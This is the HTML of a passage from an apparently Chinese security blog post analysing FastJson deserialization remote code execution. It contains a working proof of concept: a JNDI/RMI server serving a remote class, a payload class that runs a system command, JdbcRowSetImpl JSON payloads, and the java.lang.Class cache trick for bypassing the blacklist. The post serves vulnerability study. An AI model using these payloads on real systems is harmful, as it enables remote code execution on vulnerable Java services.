</span></span><span style="display:flex;"><span>invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
</span></span><span style="display:flex;"><span>invoke:62, NativeMethodAccessorImpl (sun.reflect)
</span></span><span style="display:flex;"><span>invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
</span></span><span style="display:flex;"><span>invoke:498, Method (java.lang.reflect)
</span></span><span style="display:flex;"><span>setValue:96, FieldDeserializer (com.alibaba.fastjson.parser.deserializer)
</span></span><span style="display:flex;"><span>parseField:83, DefaultFieldDeserializer (com.alibaba.fastjson.parser.deserializer)
</span></span><span style="display:flex;"><span>parseField:773, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)
</span></span><span style="display:flex;"><span>deserialze:600, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)
</span></span><span style="display:flex;"><span>parseRest:922, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)
</span></span><span style="display:flex;"><span>deserialze:-1, FastjsonASMDeserializer_1_JdbcRowSetImpl (com.alibaba.fastjson.parser.deserializer)
</span></span><span style="display:flex;"><span>deserialze:184, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)
</span></span><span style="display:flex;"><span>parseObject:368, DefaultJSONParser (com.alibaba.fastjson.parser)
</span></span><span style="display:flex;"><span>parse:1327, DefaultJSONParser (com.alibaba.fastjson.parser)
</span></span><span style="display:flex;"><span>parse:1293, DefaultJSONParser (com.alibaba.fastjson.parser)
</span></span><span style="display:flex;"><span>parse:137, JSON (com.alibaba.fastjson)
</span></span><span style="display:flex;"><span>parse:128, JSON (com.alibaba.fastjson)
</span></span><span style="display:flex;"><span>main:123, FastJsonTest (com.reus09)
</span></span></code></pre></td></tr></table>
</div>
</div><p>å…ˆçœ‹ä¸€ä¸‹ <code>setAutoCommit()</code> æ–¹æ³•ï¼Œåœ¨ <code>conn</code> ä¸ºç©ºæ—¶ï¼Œå°†ä¼šè°ƒç”¨ <code>connect()</code> æ–¹æ³•ã€‚</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20221012170224510.png" alt="image-20221012170224510"  />
</p>
<p>ç„¶ååœ¨<code>connect</code>æ–¹æ³•é‡Œé¢è°ƒç”¨äº† <code>javax.naming.InitialContext#lookup()</code> æ–¹æ³•ï¼Œå‚æ•°ä»æˆå‘˜å˜é‡ <code>dataSource</code> ä¸­è·å–ã€‚</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20221012170333164.png" alt="image-20221012170333164"  />
</p>
<ul>
<li>é€šè¿‡å‡½æ•°æ ˆçš„å˜åŒ–ï¼Œå¯ä»¥å¾ˆæ˜æ˜¾çš„çœ‹åˆ°ï¼Œåœ¨<code>FastJson</code>è§£æå‡½æ•°<code>parse</code>å‡½æ•°ä½œç”¨çš„æ—¶å€™ï¼Œé€šè¿‡åå°„ç»™ç±»çš„å…ƒç´ èµ‹å€¼çš„æ—¶å€™å¼•èµ·çš„å‘½ä»¤æ‰§è¡Œã€‚</li>
</ul>
<p>ç¼–å†™ä¸€ä¸ª<code>JNDI</code>æœåŠ¡</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">12
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">13
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">14
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">15
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">16
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">17
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">18
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">19
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">20
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">21
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">22
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">23
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">24
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">25
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">package</span> com.reus09;
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">import</span> javax.naming.NamingException;
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">import</span> javax.naming.Reference;
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">import</span> java.rmi.AlreadyBoundException;
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">import</span> java.rmi.RemoteException;
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">import</span> java.rmi.registry.LocateRegistry;
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">import</span> java.rmi.registry.Registry;
</span></span><span style="display:flex;"><span><span style="color:#007f7f">/**
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"> * @ClassName JDNIServer
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"> * @Description TODO
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"> * @Author reus09
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"> * @Date 2022/10/12 18:09
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"> * @Version 1.0
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"> **/</span>
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">public</span> <span style="color:#fff;font-weight:bold">class</span> JDNIServer {
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">public</span> <span style="color:#fff;font-weight:bold">static</span> <span style="color:#fff;font-weight:bold">void</span> main(String[] args) <span style="color:#fff;font-weight:bold">throws</span> RemoteException, NamingException, AlreadyBoundException {
</span></span><span style="display:flex;"><span>        Registry registry = LocateRegistry.<span style="color:#007f7f">createRegistry</span>(1099);
</span></span><span style="display:flex;"><span>        Reference reference = <span style="color:#fff;font-weight:bold">new</span> Reference(<span style="color:#0ff;font-weight:bold">&#34;com.reus09.badClassName&#34;</span>,
</span></span><span style="display:flex;"><span>                <span style="color:#0ff;font-weight:bold">&#34;com.reus09.badClassName&#34;</span>,<span style="color:#0ff;font-weight:bold">&#34;http://127.0.0.1:8000/&#34;</span>);
</span></span><span style="display:flex;"><span>        ReferenceWrapper referenceWrapper = <span style="color:#fff;font-weight:bold">new</span> ReferenceWrapper(reference);
</span></span><span style="display:flex;"><span>        registry.<span style="color:#007f7f">bind</span>(<span style="color:#0ff;font-weight:bold">&#34;Exploit&#34;</span>,referenceWrapper);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">12
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">13
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">14
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">15
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">16
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">17
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">18
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">19
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">20
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">package</span> com.reus09;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">import</span> javax.naming.Context;
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">import</span> javax.naming.Name;
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">import</span> javax.naming.spi.ObjectFactory;
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">import</span> java.io.IOException;
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">import</span> java.util.Hashtable;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">public</span> <span style="color:#fff;font-weight:bold">class</span> badClassName <span style="color:#fff;font-weight:bold">implements</span> ObjectFactory {
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">public</span> badClassName() <span style="color:#fff;font-weight:bold">throws</span> IOException {
</span></span><span style="display:flex;"><span>        Runtime.<span style="color:#007f7f">getRuntime</span>().<span style="color:#007f7f">exec</span>(<span style="color:#0ff;font-weight:bold">&#34;open /System/Applications/Calculator.app&#34;</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    @Override
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">public</span> Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable&lt;?, ?&gt; environment) <span style="color:#fff;font-weight:bold">throws</span> Exception {
</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">return</span> <span style="color:#fff;font-weight:bold">null</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></td></tr></table>
</div>
</div><p><code>Payload</code>éƒ¨åˆ†</p>
<ul>
<li>
<p>JSONæ ¼å¼</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">5
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>	<span style="font-weight:bold">&#34;@type&#34;</span>:<span style="color:#0ff;font-weight:bold">&#34;com.sun.rowset.JdbcRowSetImpl&#34;</span>,
</span></span><span style="display:flex;"><span>	<span style="font-weight:bold">&#34;dataSourceName&#34;</span>:<span style="color:#0ff;font-weight:bold">&#34;rmi://127.0.0.1:1099/Exploit&#34;</span>,
</span></span><span style="display:flex;"><span>	<span style="font-weight:bold">&#34;autoCommit&#34;</span>:<span style="color:#fff;font-weight:bold">true</span>
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></td></tr></table>
</div>
</div></li>
<li>
<p>ä»£ç </p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">8
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#007f7f">// è§£å†³javaç‰ˆæœ¬è¿‡é«˜çš„é—®é¢˜ï¼Œé»˜è®¤ä»¥ä¸‹çš„å…ƒç´ éƒ½ä¸ºfalse 
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>System.<span style="color:#007f7f">setProperty</span>(<span style="color:#0ff;font-weight:bold">&#34;com.sun.jndi.ldap.object.trustURLCodebase&#34;</span>,<span style="color:#0ff;font-weight:bold">&#34;true&#34;</span>);
</span></span><span style="display:flex;"><span>System.<span style="color:#007f7f">setProperty</span>(<span style="color:#0ff;font-weight:bold">&#34;com.sun.jndi.rmi.object.trustURLCodebase&#34;</span>,<span style="color:#0ff;font-weight:bold">&#34;true&#34;</span>);
</span></span><span style="display:flex;"><span>System.<span style="color:#007f7f">setProperty</span>(<span style="color:#0ff;font-weight:bold">&#34;com.sun.jndi.cosnaming.object.trustURLCodebase&#34;</span>,<span style="color:#0ff;font-weight:bold">&#34;true&#34;</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>System.<span style="color:#007f7f">out</span>.<span style="color:#007f7f">println</span>(<span style="color:#0ff;font-weight:bold">&#34;JdbcRowSetImpl  é“¾çš„åˆ©ç”¨&#34;</span>);
</span></span><span style="display:flex;"><span>String payload2 = <span style="color:#0ff;font-weight:bold">&#34;{\&#34;@type\&#34;:\&#34;com.sun.rowset.JdbcRowSetImpl\&#34;,\&#34;dataSourceName\&#34;:\&#34;rmi://127.0.0.1:1099/Exploit\&#34;, \&#34;autoCommit\&#34;:true}&#34;</span>;
</span></span><span style="display:flex;"><span>JSON.<span style="color:#007f7f">parse</span>(payload2);
</span></span></code></pre></td></tr></table>
</div>
</div><p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20221012184649052.png" alt="image-20221012184649052"  />
</p>
</li>
</ul>
<h2 id="autotypeæœºåˆ¶">AutoTypeæœºåˆ¶<a hidden class="anchor" aria-hidden="true" href="#autotypeæœºåˆ¶">#</a></h2>
<p>Fastjsonæä¾›äº†autotypeåŠŸèƒ½,å…è®¸ç”¨æˆ·åœ¨ååºåˆ—åŒ–æ•°æ®ä¸­é€šè¿‡â€œ@typeâ€æŒ‡å®šååºåˆ—åŒ–çš„Classç±»å‹ã€‚</p>
<p>ç®€å•çš„æ¥è¯´å°±æ˜¯ï¼šå½“ä¸€ä¸ªç±»ä¸­åŒ…å«äº†ä¸€ä¸ªæ¥å£ï¼ˆæˆ–æŠ½è±¡ç±»ï¼‰çš„æ—¶å€™ï¼Œåœ¨æ­£å¸¸ååºåˆ—åŒ–ä¸­ï¼Œä¼šå°†å­ç±»å‹æŠ¹å»ï¼Œåªä¿ç•™æ¥å£ï¼ˆæŠ½è±¡ç±»ï¼‰çš„ç±»å‹ï¼Œä½¿å¾—ååºåˆ—åŒ–æ—¶æ— æ³•æ‹¿åˆ°åŸå§‹ç±»å‹ã€‚<code>FastJson</code>é€šè¿‡ä½¿ç”¨<code>autotype</code>æ¥å¯¹æŒ‡å®šçš„<code>@type</code>å®ç°çš„æ¥å£åŒæ ·è¿›è¡Œæ­£å¸¸ååºåˆ—åŒ–ã€‚</p>
<p>å…·ä½“çš„è¯ï¼Œçœ‹<a href="https://juejin.cn/post/6846687594130964488#heading-0">åšå®¢</a>å¯¹<code>AutoType</code>èµ·åˆ°çš„ä½œç”¨è¿›è¡Œäº†ç®€å•çš„demoä¹¦å†™ã€‚</p>
<p>ä½†æ˜¯<code>FastJson</code>å®˜æ–¹åœ¨<code>1.2.25</code>ä¹‹åå°†<code>AutoType</code>æœºåˆ¶å…³é—­ï¼Œä¸”åŠ å…¥äº†checkAutotypeï¼ŒåŠ å…¥äº†é»‘åå•+ç™½åå•æ¥é˜²å¾¡autotypeå¼€å¯çš„æƒ…å†µï¼Œè‡ªæ­¤å®˜æ–¹ä¸é»‘å®¢çš„åšå¼ˆå°±åœ¨ä¸æ–­è¿›è¡Œï¼Œé»‘å®¢è¯•å›¾å¯»æ‰¾å¯åˆ©ç”¨çš„ç±»ï¼Œè€Œå®˜æ–¹ä¸æ–­çš„å°†å¯åˆ©ç”¨çš„ç±»åŠ å…¥é»‘åå•ï¼Œä¼˜åŒ–è‡ªå·±çš„<code>checkAutoType</code>æœºåˆ¶ã€‚</p>
<p>æœŸé—´ä¸€äº›ç»•è¿‡æ–¹æ¡ˆæ¯”å¦‚:<code>L</code>ã€<code>;</code>ã€<code>[</code>çš„ä¸€äº›ç»•è¿‡ï¼Œè¯¦æƒ…çœ‹[ç´ 18][https://su18.org/post/fastjson/#6-fastjson-1245]å¸ˆå‚…å¯¹æ­¤çš„ç›¸å…³ä»‹ç»ã€‚</p>
<p>ä½†æ˜¯åœ¨<code>1.2.47</code>ç‰ˆæœ¬ï¼Œçˆ†å‡ºäº†æœ€ä¸ºä¸¥é‡çš„æ¼æ´ï¼Œå¯ä»¥åœ¨ä¸å¼€å¯ AutoTypeSupport çš„æƒ…å†µä¸‹è¿›è¡Œååºåˆ—åŒ–çš„åˆ©ç”¨ï¼Œä¸»è¦æ˜¯å…ˆæŠŠä¸€ä¸ªç±»åŠ åˆ°ç¼“å­˜ä¸­ï¼Œç„¶åå†æ¬¡æ‰§è¡Œçš„æ—¶å€™å°±å¯ä»¥ç»•è¿‡é»‘ç™½åå•æ£€æµ‹äº†ï¼Œé¦–å…ˆæƒ³è¦æŠŠä¸€ä¸ªé»‘åå•ä¸­çš„ç±»åŠ åˆ°ç¼“å­˜ä¸­ï¼Œéœ€è¦ä½¿ç”¨ä¸€ä¸ªä¸åœ¨é»‘åå•ä¸­çš„ç±»ï¼Œè¿™ä¸ªç±»å°±æ˜¯<code>java.lang.Class</code>ï¼Œ<code>java.lang.Class</code>ç±»å¯¹åº”çš„deserializerä¸ºMiscCodecï¼Œååºåˆ—åŒ–æ—¶ä¼šå–jsonä¸²ä¸­çš„valå€¼å¹¶åŠ è½½è¿™ä¸ªvalå¯¹åº”çš„ç±»ã€‚</p>
<p>å¦‚æœå†æ¬¡åŠ è½½valåç§°çš„ç±»ï¼Œå¹¶ä¸”autotypeæ²¡å¼€å¯ï¼Œä¸‹ä¸€æ­¥å°±æ˜¯ä¼šå°è¯•ä»å…¨å±€ç¼“å­˜ä¸­è·å–è¿™ä¸ªclassï¼Œè¿›è€Œè¿›è¡Œæ”»å‡»ã€‚</p>
<p><code>payload</code>ï¼š</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="font-weight:bold">&#34;@type&#34;</span>: <span style="color:#0ff;font-weight:bold">&#34;java.lang.Class&#34;</span>,
</span></span><span style="display:flex;"><span>	<span style="font-weight:bold">&#34;val&#34;</span>: <span style="color:#0ff;font-weight:bold">&#34;com.sun.rowset.JdbcRowSetImpl&#34;</span>
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></td></tr></table>
</div>
</div><p>ä¹‹ååœ¨<code>1.2.68</code>å‡ºç°äº†å¯¹<code>Throwable</code>ç±»çš„åˆ©ç”¨ï¼Œå¦‚æœï¼Œ@type æŒ‡å®šçš„ç±»ä¸º Throwable çš„å­ç±»ï¼Œé‚£å¯¹åº”çš„ååºåˆ—åŒ–å¤„ç†ç±»å°±ä¼šä½¿ç”¨åˆ° <code>ThrowableDeserializer</code>ï¼Œè€Œåœ¨<code>ThrowableDeserializer#deserialze</code>çš„æ–¹æ³•ä¸­ï¼Œå½“æœ‰ä¸€ä¸ªå­—æ®µçš„keyä¹Ÿæ˜¯ @typeæ—¶ï¼Œå°±ä¼šæŠŠè¿™ä¸ª value å½“åšç±»åï¼Œç„¶åè¿›è¡Œä¸€æ¬¡<code>checkAutoType</code>æ£€æµ‹ã€‚</p>
<p>å‰©ä¸‹çš„å¯ä»¥çœ‹<code>FastJson1.2.80</code>çš„ç›¸å…³åˆ†æã€‚</p>
<h2 id="æ€»ç»“">æ€»ç»“<a hidden class="anchor" aria-hidden="true" href="#æ€»ç»“">#</a></h2>
<p>å®é™…ä¸Šï¼Œå­¦ä¹ åˆ°äº†ä¸€äº›<code>FastJsonååºåˆ—åŒ–</code>çš„åŸºæœ¬åŸç†ï¼Œä¹‹å‰éƒ½æ˜¯äº‘é‡Œé›¾é‡Œï¼Œä¸çŸ¥å…¶æ‰€ä»¥ç„¶ã€‚æ­¤å¤–ï¼Œå¯¹<code>FastJson</code>çš„<code>parse</code>ã€<code>parseObject</code>ç›¸å…³æ–¹æ³•çš„åŒºåˆ«ã€‚è¿˜æœ‰å°±æ˜¯å‘ç°ç°åœ¨å†™åšå®¢å¾€å¾€éƒ½æ˜¯å¯¹åˆ«äººçš„æ–‡ç« å¤§æŠ„ç‰¹æŠ„ï¼Œè‡ªå·±çš„ä¸œè¥¿ã€æ€è€ƒå¤ªå°‘äº†ï¼Œä¸ºä»€ä¹ˆè¦è¿™æ ·å†™?ä¸ºä»€ä¹ˆè¿™ä¹ˆæ€è€ƒ?ä»¥åè¿˜æ˜¯éœ€è¦åŠªåŠ›ã€‚</p>
<h2 id="reference">Reference<a hidden class="anchor" aria-hidden="true" href="#reference">#</a></h2>
<ul>
<li><a href="https://su18.org/post/fastjson/#1-fastjson-1224">https://su18.org/post/fastjson/#1-fastjson-1224</a></li>
<li><a href="http://blog.topsec.com.cn/fastjson-1-2-24%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%bc%8f%e6%b4%9e%e6%b7%b1%e5%ba%a6%e5%88%86%e6%9e%90/">http://blog.topsec.com.cn/fastjson-1-2-24%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%bc%8f%e6%b4%9e%e6%b7%b1%e5%ba%a6%e5%88%86%e6%9e%90/</a></li>
<li><a href="https://www.yang99.top/index.php/archives/71/">https://www.yang99.top/index.php/archives/71/</a></li>
<li><a href="https://paper.seebug.org/1192/#comsunrowsetjdbcrowsetimpl">https://paper.seebug.org/1192/#comsunrowsetjdbcrowsetimpl</a></li>
<li><a href="https://juejin.cn/post/6846687594130964488#heading-3">https://juejin.cn/post/6846687594130964488#heading-3</a></li>
<li><a href="https://blog.csdn.net/hosaos/article/details/106982555">https://blog.csdn.net/hosaos/article/details/106982555</a></li>
</ul>


  </div>

  <footer class="post-footer">
    <ul class="post-tags">
    </ul>
<nav class="paginav">
  <a class="next" href="http://www.reus09.top/posts/tech/cve-2022-25845-fastjson-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">
    <span class="title">Next Â»</span>
    <br>
    <span>CVE-2022-25845 FastJson RCEæ¼æ´åˆ†æ</span>
  </a>
</nav>

  </footer>
</article>
    </main>
    
<footer class="footer">
    <span>&copy; 2022 <a href="http://www.reus09.top">Reus09&#39;s Blog</a></span>
    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
    </span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
